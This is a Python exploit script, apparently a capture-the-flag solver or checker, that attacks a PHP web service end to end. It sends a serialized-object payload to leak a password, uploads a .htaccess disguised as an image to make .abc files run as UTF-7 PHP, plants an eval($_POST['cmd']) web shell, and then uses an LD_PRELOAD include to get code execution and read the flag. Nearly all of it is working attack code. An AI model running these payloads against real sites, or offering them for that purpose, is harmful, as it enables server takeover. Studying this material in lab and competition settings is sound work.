import sys
import requests

if(len(sys.argv) != 3):
	# print("usage:python exp.py ip port")
	url = "http://10.212.27.23:8693/"
else:
	url = "http://%s:%s/"%(sys.argv[1],sys.argv[2])
	
password = "ob_end_clean_is_surplus"

obj = """a:2:{i:0;O:7:"GetPass":3:{s:7:"abandon";r:2;s:6:"boring";s:4:"read";s:4:"code";s:6:"hidden";}i:1;O:7:"GetPass":3:{s:7:"abandon";r:6;s:6:"boring";s:4:"read";s:4:"code";s:4:"this";}}"""

try:
	response = requests.get(url, params={'obj':obj})
except requests.exceptions.ConnectionError:
	print("(0,Serivice unavailable)")
	exit()
if(password not in response.text):
	print("(0,Fetch password failure)")
	exit()

htaccess = b"""#define width 1337
#define height 1337
AddType application/x-httpd-php .abc
php_flag display_errors on
php_flag zend.multibyte 1
php_value zend.script_encoding "UTF-7"
"""
shell = b"""#define width 1337
#define height 1337
+ADw?php eval(+ACQAXw-POST+AFs'cmd'+AF0)+ADs?+AD4-
"""

files = {'file':('.htaccess',htaccess,'image/jpeg')}
try:
	response = requests.post(url=url, params={'pass':password}, files=files)
except requests.exceptions.ConnectionError:
	print("(0,Serivice unavailable)")
	exit()
if('.htaccess' not in response.text):
	print("(0,Upload .htaccess failure)")
	exit()

files = {'file':('shell.abc',shell,'image/jpeg')}
try:
	response = requests.post(url=url, params={'pass':password}, files=files)
except requests.exceptions.ConnectionError:
	print("(0,Serivice unavailable)")
	exit()
if('shell.abc' not in response.text):
	print("(0,Upload shell.abc failure)")
	exit()
shellpath = response.text
print(shellpath)

cmd="move_uploaded_file($_FILES['file']['tmp_name'], 'ld_preload.php');include 'ld_preload.php';"
f=open('ld_preload.php','r')
files = {'file':('ld_preload.php',f.read(),'image/jpeg')}
f.close()
try:
	response = requests.post(url=url+shellpath, data={'cmd':cmd}, files=files)
except requests.exceptions.ConnectionError:
	print("(0,Serivice unavailable)")
	exit()
if('flag{' not in response.text):
	print("(0,RCE failure)")
else:
	print("(1,Exploit success)")
	print(response.text[response.text.find('flag{'):])
	
